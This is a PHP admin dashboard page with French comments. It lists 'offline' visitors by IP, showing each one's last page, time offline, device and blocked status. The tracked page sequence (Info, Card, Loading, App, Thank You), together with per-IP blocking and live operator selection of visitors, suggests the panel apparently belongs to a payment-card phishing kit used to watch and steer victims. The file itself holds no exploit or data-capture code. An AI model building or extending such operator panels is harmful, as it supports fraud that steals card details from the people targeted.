<?php
session_start();
require_once 'config.php';

// Vérifier que l'admin est connecté
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: admin.php');
    exit;
}

// Lire les visiteurs
$visitorsFile = DATA_DIR . 'visitors.json';
$visitors = [];
if (file_exists($visitorsFile)) {
    $visitors = json_decode(file_get_contents($visitorsFile), true) ?: [];
}

// Filtrer seulement les visiteurs offline
$offlineVisitors = [];
foreach ($visitors as $ip => $visitor) {
    if ($visitor['status'] === 'offline') {
        $offlineVisitors[] = $visitor;
    }
}

// Trier par dernière visite (plus récent en premier)
usort($offlineVisitors, function($a, $b) {
    return $b['last_seen'] - $a['last_seen'];
});

function getPageDisplayName($pageName) {
    $pageNames = [
        'info' => '📝 Info',
        'card' => '💳 Card', 
        'loading' => '⏳ Loading',
        'app' => '📱 App',
        'thankyou' => '🎉 Thank You',
        'index' => '🏠 Index',
        'page1' => '📝 Info',
        'page2' => '💳 Card',
        'page3' => '⏳ Loading', 
        'page4' => '📱 App',
        'page5' => '🎉 Thank You'
    ];
    return $pageNames[$pageName] ?? "📄 $pageName";
}

function getCountryFlag($countryCode) {
    $flags = [
        'US' => '🇺🇸', 'FR' => '🇫🇷', 'DE' => '🇩🇪', 'GB' => '🇬🇧', 'ES' => '🇪🇸', 'IT' => '🇮🇹',
        'CA' => '🇨🇦', 'AU' => '🇦🇺', 'JP' => '🇯🇵', 'CN' => '🇨🇳', 'IN' => '🇮🇳', 'BR' => '🇧🇷',
        'RU' => '🇷🇺', 'MX' => '🇲🇽', 'NL' => '🇳🇱', 'SE' => '🇸🇪', 'NO' => '🇳🇴', 'DK' => '🇩🇰',
        'MA' => '🇲🇦', 'DZ' => '🇩🇿', 'TN' => '🇹🇳', 'EG' => '🇪🇬', 'SA' => '🇸🇦', 'AE' => '🇦🇪'
    ];
    return $flags[strtoupper($countryCode)] ?? '🌍';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Offline Visitors | Admin Dashboard</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
        }

        .back-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.2s;
        }

        .back-btn:hover {
            background: rgba(255,255,255,0.3);
        }

        .stats {
            padding: 20px 30px;
            background: #f8fafc;
            border-bottom: 1px solid #e5e7eb;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }

        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #6b7280;
        }

        .stat-card:nth-child(1) .stat-number { color: #6b7280; }
        .stat-card:nth-child(2) .stat-number { color: #dc2626; }
        .stat-card:nth-child(3) .stat-number { color: #f59e0b; }
        .stat-card:nth-child(4) .stat-number { color: #9ca3af; }

        .stat-label {
            color: #9ca3af;
            font-size: 14px;
            margin-top: 5px;
        }

        .visitors-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            padding: 30px;
        }

        .visitor-card {
            background: white;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 20px;
            transition: all 0.2s;
            cursor: pointer;
        }

        .visitor-card:hover {
            border-color: #3b82f6;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
        }

        .visitor-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 15px;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #6b7280;
        }

        .visitor-ip {
            font-size: 18px;
            font-weight: 600;
            color: #1f2937;
        }

        .visitor-details {
            display: grid;
            gap: 8px;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid #f3f4f6;
        }

        .detail-row:last-child {
            border-bottom: none;
        }

        .detail-label {
            color: #6b7280;
            font-size: 14px;
            font-weight: 500;
        }

        .detail-value {
            color: #1f2937;
            font-size: 14px;
            text-align: right;
        }

        .blocked-indicator {
            background: #fee2e2;
            color: #dc2626;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #6b7280;
        }

        .empty-state h3 {
            font-size: 20px;
            margin-bottom: 10px;
        }

        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #3b82f6;
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            font-size: 20px;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
            transition: all 0.2s;
        }

        .refresh-btn:hover {
            background: #2563eb;
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚪ Offline Visitors</h1>
            <a href="admin.php" class="back-btn">← Back to Dashboard</a>
        </div>

        <div class="stats">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($offlineVisitors); ?></div>
                    <div class="stat-label">Total Offline Visitors</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">
                        <?php 
                        $blockedCount = 0;
                        foreach ($offlineVisitors as $visitor) {
                            if (isset($visitor['blocked']) && $visitor['blocked'] === true) {
                                $blockedCount++;
                            }
                        }
                        echo $blockedCount;
                        ?>
                    </div>
                    <div class="stat-label">Blocked Offline</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">
                        <?php 
                        $recentCount = 0;
                        $currentTime = time();
                        foreach ($offlineVisitors as $visitor) {
                            if (($currentTime - $visitor['last_seen']) < 300) { // 5 minutes
                                $recentCount++;
                            }
                        }
                        echo $recentCount;
                        ?>
                    </div>
                    <div class="stat-label">Recently Offline (5min)</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">
                        <?php 
                        $oldCount = 0;
                        $currentTime = time();
                        foreach ($offlineVisitors as $visitor) {
                            if (($currentTime - $visitor['last_seen']) > 3600) { // Plus d'1 heure
                                $oldCount++;
                            }
                        }
                        echo $oldCount;
                        ?>
                    </div>
                    <div class="stat-label">Offline >1h</div>
                </div>
            </div>
        </div>

        <div class="visitors-grid">
            <?php if (empty($offlineVisitors)): ?>
                <div class="empty-state">
                    <h3>No Offline Visitors</h3>
                    <p>All visitors are currently active or no visitors have been recorded yet.</p>
                </div>
            <?php else: ?>
                <?php foreach ($offlineVisitors as $visitor): ?>
                    <div class="visitor-card" onclick="selectVisitor('<?php echo htmlspecialchars($visitor['ip']); ?>')">
                        <div class="visitor-header">
                            <div class="status-dot"></div>
                            <div class="visitor-ip">
                                <?php echo htmlspecialchars($visitor['ip']); ?>
                                <?php if ($visitor['blocked'] ?? false): ?>
                                    <span class="blocked-indicator">🚫 BLOCKED</span>
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <div class="visitor-details">
                            <div class="detail-row">
                                <span class="detail-label">Last Page</span>
                                <span class="detail-value"><?php echo getPageDisplayName($visitor['current_page']); ?></span>
                            </div>
                            <div class="detail-row">
                                <span class="detail-label">Last Seen</span>
                                <span class="detail-value"><?php echo date('H:i:s', $visitor['last_seen']); ?></span>
                            </div>
                            <div class="detail-row">
                                <span class="detail-label">Time Offline</span>
                                <span class="detail-value">
                                    <?php 
                                    $offlineTime = time() - $visitor['last_seen'];
                                    if ($offlineTime < 60) {
                                        echo $offlineTime . 's ago';
                                    } elseif ($offlineTime < 3600) {
                                        echo floor($offlineTime / 60) . 'm ago';
                                    } else {
                                        echo floor($offlineTime / 3600) . 'h ago';
                                    }
                                    ?>
                                </span>
                            </div>
                            <div class="detail-row">
                                <span class="detail-label">Source</span>
                                <span class="detail-value"><?php echo htmlspecialchars($visitor['source'] ?? 'Direct'); ?></span>
                            </div>
                            <div class="detail-row">
                                <span class="detail-label">Device</span>
                                <span class="detail-value">
                                    <?php 
                                    $userAgent = $visitor['user_agent'] ?? '';
                                    if (stripos($userAgent, 'mobile') !== false || stripos($userAgent, 'android') !== false || stripos($userAgent, 'iphone') !== false) {
                                        echo '📱 Mobile';
                                    } elseif (stripos($userAgent, 'tablet') !== false || stripos($userAgent, 'ipad') !== false) {
                                        echo '📱 Tablet';
                                    } else {
                                        echo '🖥️ PC';
                                    }
                                    ?>
                                </span>
                            </div>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>

    <button class="refresh-btn" onclick="location.reload()" title="Refresh">🔄</button>

    <script>
        function selectVisitor(ip) {
            // Ouvrir le panneau admin avec ce visiteur sélectionné
            window.open(`admin.php?select=${encodeURIComponent(ip)}`, '_blank');
        }

        // Auto-refresh toutes les 30 secondes
        setInterval(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
